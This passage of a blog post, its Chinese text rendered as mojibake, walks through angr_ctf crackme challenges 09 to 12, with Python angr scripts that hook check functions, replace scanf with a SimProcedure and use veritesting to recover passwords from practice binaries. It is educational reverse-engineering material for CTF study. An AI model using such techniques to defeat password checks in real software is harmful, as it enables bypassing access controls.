= <span class="hljs-number">0x804937D</span> <span class="hljs-comment"># first insn after first scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># because we have passed the qmemcpy() that initial the password&#x27;s memory,</span><br>    <span class="hljs-comment"># so we need to do it manually</span><br>    password_size = <span class="hljs-number">0x10</span><br>    password_addr = <span class="hljs-number">0x804C034</span><br>    init_state.memory.store(password_addr,<br>                            claripy.BVV(<span class="hljs-built_in">int</span>.from_bytes(compared_str, <span class="hljs-string">&quot;big&quot;</span>), <br>                                        password_size * <span class="hljs-number">8</span>))<br><br><span class="hljs-meta">    @proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># eax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = <span class="hljs-number">0x80493D3</span>) <span class="hljs-comment"># first insn after my_hook_func() returned</span><br><br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br>    check_state.add_constraints(check_state.regs.eax == <span class="hljs-number">1</span>) <span class="hljs-comment"># constraint for eval == 1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password0: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br>    <span class="hljs-comment"># now we need to calculate the password&#x27;s val after complex()</span><br>    simgr2 = proj.factory.simgr(check_state)<br>    simgr2.explore(find = <span class="hljs-number">0x8049428</span>) <span class="hljs-comment"># last insn before second scanf()</span><br><br>    check_state2 = simgr2.found[<span class="hljs-number">0</span>]<br>    password = check_state2.memory.load(password_addr, password_size)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password1: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state2.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ç§’è§£ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/02/xHpXA6WNqwisaLT.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ç§æ›´åŠ ç®€æ´çš„å†™æ³•å°±æ˜¯ hook æ‰ <code>check_equals()</code> ä¹‹åç›´æ¥ä» <code>entry_state</code> å¼€å§‹ explore() åˆ°è¾“å‡º <code>&quot;Good Job.&quot;</code> ï¼Œä½†ç¬”è€…åœ¨åˆšå¼€å§‹å†™çš„æ—¶å€™æ˜¯æ²¡æƒ³åˆ°çš„â€¦</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    init_state = proj.factory.entry_state()<br><br><span class="hljs-meta">    @proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># rax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>


</blockquote>
<h2 id="10-angr-simproceduresï¼šæ¨¡æ‹Ÿè¿‡ç¨‹è°ƒç”¨"><a href="#10-angr-simproceduresï¼šæ¨¡æ‹Ÿè¿‡ç¨‹è°ƒç”¨" class="headerlink" title="10_angr_simproceduresï¼šæ¨¡æ‹Ÿè¿‡ç¨‹è°ƒç”¨"></a>10_angr_simproceduresï¼šæ¨¡æ‹Ÿè¿‡ç¨‹è°ƒç”¨</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDA ï¼Œè¿™ä¸€æ¬¡çš„ä¼ªä»£ç è¿˜æ˜¯ä¸€å¨å²æ‰€ä»¥ç›´æ¥çœ‹æ±‡ç¼–ï¼Œå¯ä»¥çœ‹åˆ°è™½ç„¶è¿˜æ˜¯æƒ¯ä¾‹çš„ <code>complex_function()</code> å¯¹è¾“å…¥è¿›è¡Œå¤„ç†åä½¿ç”¨ <code>check_equals()</code> è¿›è¡Œè·¯å¾„çˆ†ç‚¸çš„é€å­—ç¬¦æ¯”è¾ƒï¼Œä½†ä¸åŒçš„æ˜¯è¿™ä¸€æ¬¡å¤šäº†è®¸å¤šçš„ä¼ªè·¯å¾„ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/02/rj5ThAGsOeql9FP.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è€Œæ¯ä¸ªä¼ªè·¯å¾„åé¢éƒ½å¯¹åº”ç€ä¸€ä¸ªè·¯å¾„çˆ†ç‚¸çš„ <code>check_equals()</code> ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/02/pLiH6FYE1DJfrc9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å¦‚æœæˆ‘ä»¬å¯¹äºæ¯ä¸ªä¼ªè·¯å¾„åè¾¹çš„åŸºæœ¬å—éƒ½æ‰‹åŠ¨è¿›è¡Œ hookï¼Œé‚£æœªå…ä¹Ÿè¿‡äºéº»çƒ¦ï¼Œå› æ­¤è¿™ä¸€æ¬¡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ angr ç›´æ¥é€šè¿‡å‡½æ•°ç¬¦å·æ¥ hook æ‰ <code>check_equals()</code> å‡½æ•°</p>
<h3 id="angr-SimProcedure-æ¨¡æ‹Ÿå‡½æ•°ï¼ˆè¿‡ç¨‹ï¼‰"><a href="#angr-SimProcedure-æ¨¡æ‹Ÿå‡½æ•°ï¼ˆè¿‡ç¨‹ï¼‰" class="headerlink" title="angr.SimProcedure - æ¨¡æ‹Ÿå‡½æ•°ï¼ˆè¿‡ç¨‹ï¼‰"></a>angr.SimProcedure - æ¨¡æ‹Ÿå‡½æ•°ï¼ˆè¿‡ç¨‹ï¼‰</h3><p>åœ¨ angr ä¸­ <code>angr.SimProcedure</code> ç±»ç”¨æ¥è¡¨ç¤º<strong>åœ¨ä¸€ä¸ªçŠ¶æ€ä¸Šçš„ä¸€ä¸ªè¿è¡Œè¿‡ç¨‹</strong>â€”â€”å³å‡½æ•°å®é™…ä¸Šæ˜¯ä¸€ä¸ª SimPrecedure</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªç»§æ‰¿è‡ª <code>angr.SimProcedure</code> çš„ç±»å¹¶é‡å†™ <code>run()</code> æ–¹æ³•çš„æ–¹å¼æ¥è¡¨ç¤ºä¸€ä¸ªè‡ªå®šä¹‰å‡½æ•°ï¼Œå…¶ä¸­ <code>run()</code> æ–¹æ³•çš„å‚æ•°ä¸ºè¯¥å‡½æ•°æ‰€æ¥æ”¶çš„å‚æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, arg1, arg2</span>):<br>        <span class="hljs-comment"># do something, this&#x27;s an example</span><br>        <span class="hljs-keyword">return</span> self.state.memory.load(arg1, arg2)<br></code></pre></td></tr></table></figure>

<p>è‡ªå®šä¹‰å‡½æ•°è¿‡ç¨‹ä¸»è¦ç”¨äºå¯¹æ–‡ä»¶ä¸­çš„åŸæœ‰å‡½æ•°è¿›è¡Œæ›¿æ¢ï¼Œä¾‹å¦‚ angr ç¼ºçœä¼šç”¨å†…ç½®çš„ä¸€äº› SimProcedure æ¥æ›¿æ¢æ‰ä¸€äº›åº“å‡½æ•°<br>è‹¥æˆ‘ä»¬å·²ç»æœ‰è¯¥äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¬¦å·è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>project.hook_symbol(symbol_str, sim_procedure_instance)</code> æ¥è‡ªåŠ¨ hook æ‰æ–‡ä»¶ä¸­æ‰€æœ‰çš„å¯¹åº”ç¬¦å·ï¼Œå…¶ä¸­ <code>run()</code> æ–¹æ³•çš„<strong>å‚æ•°ä¸ºè¢«æ›¿æ¢å‡½æ•°æ‰€æ¥æ”¶çš„å‚æ•°</strong>ï¼Œè¿™æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>class MyProcedure(angr.SimProcedure):<br>    def run(self, arg1, arg2):<br>        # do something, this&#x27;s an example<br>        return self.state.memory.load(arg1, arg2)<br><br>proj = angr.Project(&#x27;./test&#x27;)<br>proj.hook_symbol(&#x27;func_to_hook&#x27;, MyProcedure())<br></code></pre></td></tr></table></figure>

<p>å½“ç„¶ï¼Œåœ¨ SimProcedure çš„ <code>run()</code> è¿‡ç¨‹ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€äº›æœ‰ç”¨çš„æˆå‘˜å‡½æ•°ï¼š</p>
<ul>
<li><code>ret(expr)</code>: å‡½æ•°è¿”å›</li>
<li><code>jump(addr)</code>: è·³è½¬åˆ°æŒ‡å®šåœ°å€</li>
<li><code>exit(code)</code>: ç»ˆæ­¢ç¨‹åº</li>
<li><code>call(addr, args, continue_at)</code>: è°ƒç”¨æ–‡ä»¶ä¸­çš„å‡½æ•°</li>
<li><code>inline_call(procedure, *args)</code>: å†…è”åœ°è°ƒç”¨å¦ä¸€ä¸ª SimProcedure</li>
</ul>
<h3 id="FINAL-EXPLOIT-6"><a href="#FINAL-EXPLOIT-6" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬åªéœ€è¦å°†è¯¥ç¬¦å·ç›´æ¥æ›¿æ¢æˆæˆ‘ä»¬çš„è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°å³å¯ï¼Œå› æ­¤æœ€ç»ˆçš„å†™æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br>import sys<br><br>class MyRelacementHookProcedure(angr.SimProcedure):<br>    def run(self, buffer_addr, buffer_len):<br>        buffer = self.state.memory.load(buffer_addr, buffer_len)<br>        compared_str = b&#x27;XFQUUEQFKBECVEJF&#x27;<br>        return claripy.If(buffer == compared_str, claripy.BVV(1, 32), claripy.BVV(0, 32))<br><br>def find_path(state):<br>    return b&#x27;Good Job.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def avoid_path(state):<br>    return b&#x27;Try again.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def solver():<br>    bin_path = &#x27;./10_angr_simprocedures&#x27;<br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    # hook the check_equals()<br>    proj.hook_symbol(&#x27;check_equals_XFQUUEQFKBECVEJF&#x27;, MyRelacementHookProcedure())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        print(solution_state.posix.dumps(sys.stdin.fileno()))<br>    else:<br>        raise Exception(&#x27;Could not find the solution&#x27;)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ç§’è§£ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/03/1GntXiVluADdbRs.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="11-angr-sim-scanfï¼šæ¨¡æ‹Ÿ-scanf"><a href="#11-angr-sim-scanfï¼šæ¨¡æ‹Ÿ-scanf" class="headerlink" title="11_angr_sim_scanfï¼šæ¨¡æ‹Ÿ scanf"></a>11_angr_sim_scanfï¼šæ¨¡æ‹Ÿ scanf</h2><p>æƒ¯ä¾‹æ‹–è¿› IDAï¼Œæç¤º graph is too big</p>
<p><img src="https://s2.loli.net/2022/11/03/epOU2j6iDcyZutL.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>çœ‹ä¸€ä¸‹åæ±‡ç¼–ï¼Œå¯ä»¥å‘ç°è¿™ä¸€æ¬¡æ˜¯åœ¨ <code>scanf()</code> å‰é¢æœ‰å¾ˆå¤šä¼ªåˆ†æ”¯ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/03/LP97x2dUXNjTsKz.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è¿™äº›ä¼ªåˆ†æ”¯çš„å¯¼å‘éƒ½æ˜¯ä»¥ <code>scanf()</code> å¼€å¤´çš„åŸºæœ¬å—ï¼Œå¯ä»¥çœ‹åˆ°çš„æ˜¯å…¶éƒ½ä½¿ç”¨ <code>%u %u</code> æ¥è¯»å…¥ä¸¤ä¸ªå››å­—èŠ‚æ— ç¬¦å·æ•°åä½¿ç”¨ <code>strncmp()</code> ä¸ 8 å­—èŠ‚çš„å­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”</p>
<p><img src="https://s2.loli.net/2022/11/03/d4GlDOc7TANCZMS.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨æœ€å¼€å§‹è¿˜æœ‰ <code>complex_function()</code> å¤„ç†å¾…æ¯”è¾ƒçš„æºå­—ç¬¦ä¸²ï¼Œè¿˜æ˜¯è€æ ·å­å°±ä¸è¿›å»çœ‹äº†ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/03/v8bZzJgAPOpG7K4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆè¿™é¢˜çš„ç»“æ„å’Œ 02 å…¶å®æ˜¯åŸºæœ¬ä¸Šä¸€æ ·çš„ï¼Œåªä¸è¿‡ <code>scanf()</code> è¢«ç§»åˆ°äº†ä¼ªåˆ†æ”¯åŸºæœ¬å—ä¸­ï¼Œå› æ­¤ç”¨ 02 çš„è§£é¢˜è„šæœ¬ä¾ç„¶å¯ä»¥ç§’è§£ï¼Œä½†è¿™æ ·å°±ä¸æ˜¯æˆ‘ä»¬åšé¢˜çš„ç›®çš„äº†ï¼šï¼‰</p>
<p>æœ¬é¢˜å®é™…ä¸Šç®—æ˜¯å¯¹ä¸Šä¸€é¢˜çš„æ‰©å±•ï¼Œç”±äºæˆ‘ä»¬å·²çŸ¥å¯¹ <code>scanf()</code> çš„è°ƒç”¨ä¼šè¯»å…¥ä¸¤ä¸ªæ•°å€¼ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å®ç°ä¸€ä¸ª SimProcedure æ¥æ¨¡æ‹Ÿè¯¥è¿‡ç¨‹ï¼Œè€Œä¸éœ€è¦å†èµ° <code>scanf()</code> å†…éƒ¨çš„å¤æ‚è·¯å¾„</p>
<p>è¿™é‡Œæˆ‘ä»¬è‹¥æ˜¯åœ¨ <code>run()</code> æ–¹æ³•å†…åˆ›å»º BVS ï¼Œåˆ™å¯ä»¥é€šè¿‡å°†å…¶å‚¨å­˜åˆ° <code>state.globals</code> åˆ—è¡¨çš„æ–¹å¼ä»¥ä¾¿åç»­å–ç”¨</p>
<p>å› æ­¤æœ€åçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmt_str, buffer0_addr, buffer1_addr</span>):<br>        buffer0 = claripy.BVS(<span class="hljs-string">&#x27;buffer0&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        buffer1 = claripy.BVS(<span class="hljs-string">&#x27;buffer1&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        self.state.memory.store(buffer0_addr, buffer0)<br>        self.state.memory.store(buffer1_addr, buffer1)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>] = buffer0<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>] = buffer1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./11_angr_sim_scanf&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MyScanfProcedure())<br>    <br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        buffer0 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>]<br>        buffer1 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>]<br>        password0 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        password1 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password0, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password1, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ç§’è§£ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/03/pCsdR9Gckawg2Zm.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x05-angr-ctfï¼šè·¯å¾„åˆå¹¶"><a href="#0x05-angr-ctfï¼šè·¯å¾„åˆå¹¶" class="headerlink" title="0x05. angr-ctfï¼šè·¯å¾„åˆå¹¶"></a>0x05. angr-ctfï¼šè·¯å¾„åˆå¹¶</h1><h2 id="12-angr-veritestingï¼šè·¯å¾„åˆå¹¶"><a href="#12-angr-veritestingï¼šè·¯å¾„åˆå¹¶" class="headerlink" title="12_angr_veritestingï¼šè·¯å¾„åˆå¹¶"></a>12_angr_veritestingï¼šè·¯å¾„åˆå¹¶</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œä¸çŸ¥é“ä¸ºå•¥ IDA åç¼–è¯‘å‡ºæ¥ä¸€å¨å²æ‰€ä»¥ç›´æ¥çœ‹æ±‡ç¼–ï¼Œåœ¨è¯»å…¥è¾“å…¥åæ¥åˆ°çš„çº¢æ¡†é‡Œæ˜¯ä¸€ä¸ªå¾ªç¯  <code>for (int i = 0; i &lt;= 0x1F; i++)</code> ï¼Œæ¯è½®å¾ªç¯éƒ½ä¼šè®¡ç®— <code>complex_function(&#39;X&#39;, i + &#39;V&#39;)</code> å¹¶å°†ç»“æœä¸ <code>input[i]</code> å¯¹æ¯”ï¼Œå…¨éƒ¨ç›¸ç­‰æ‰èƒ½é€šè¿‡</p>
<p><img src="https://s2.loli.net/2022/11/04/WaUX8uEwyiMeJFs.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å½“ç„¶å¦‚æœå½“ä½œå¸¸è§„çš„é€†å‘é¢˜æ¥åšçš„è¯è§£é¢˜è„šæœ¬å¾ˆå¿«å°±èƒ½å†™å¥½äº†ï¼Œä½†è¿™ä¸æ˜¯æˆ‘ä»¬åšé¢˜çš„ç›®çš„ï¼šï¼‰</p>
<p>è¿™é¢˜çœ‹èµ·æ¥å’Œç¬¬ä¸€é¢˜å·®ä¸å¤šï¼Œç”±ä½†å…¶é€å­—ç¬¦æ¯”è¾ƒå¢åŠ è®¡æ•°çš„å†™æ³•ä¼šå¯¼è‡´è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¿›è¡Œ <strong>è·¯å¾„åˆå¹¶</strong> ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨åˆ›å»º simgr æ—¶æŒ‡å®šå‚æ•° <code>veritesting=True</code>ï¼Œè¿™æ · angr ä¾¿ä¼šåœ¨è¿è¡Œè¿‡ç¨‹ä¸­è‡ªåŠ¨è¿›è¡Œè·¯å¾„åˆå¹¶ï¼Œä»è€Œç¼“è§£è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜</p>
<blockquote>
<p>å…·ä½“åŸç†å¯ä»¥å‚è€ƒ <a target="_blank" rel="noopener" href="https://users.ece.cmu.edu/~dbrumley/pdf/Avgerinos%20et%20al._2014_Enhancing%20Symbolic%20Execution%20with%20Veritesting.pdf">è¿™ç¯‡è®ºæ–‡</a></p>
</blockquote>
<p>å› æ­¤æœ€åçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;12_angr_veritesting&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, veritesting = <span class="hljs-literal">True</span>)<br>    simgr.explore(find = <span class="hljs-number">0x8049371</span>, avoid = <span class="hljs-number">0x8049393</span>)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿˜æ˜¯å‡ ç§’é’Ÿå°±è§£å‡ºæ¥äº†ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/04/FvgfaL9sIjND3bh.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
